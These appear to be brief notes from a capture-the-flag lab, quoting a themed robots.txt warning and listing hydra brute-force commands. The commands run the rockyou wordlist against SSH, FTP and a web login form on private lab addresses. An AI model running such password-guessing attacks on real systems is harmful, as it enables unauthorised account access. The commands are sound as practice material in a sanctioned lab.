



/robots.txt

Skiddies keep out.
Any unauthorised access will be forwarded straight to Richard McGill FBI and you WILL be arrested.
- plague


ftp anon gives note

hydra ssh://10.10.188.182 -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 4 -V

hydra ftp://10.10.188.182 -l gcrawford -P /usr/share/wordlists/rockyou.txt -t 4 -V

 hydra 10.10.99.187 http-post-form '/api/login:username=^USER^&password=^PASS^:Incorrect' -l user -P /usr/share/wordlists/rockyou.txt -t 64
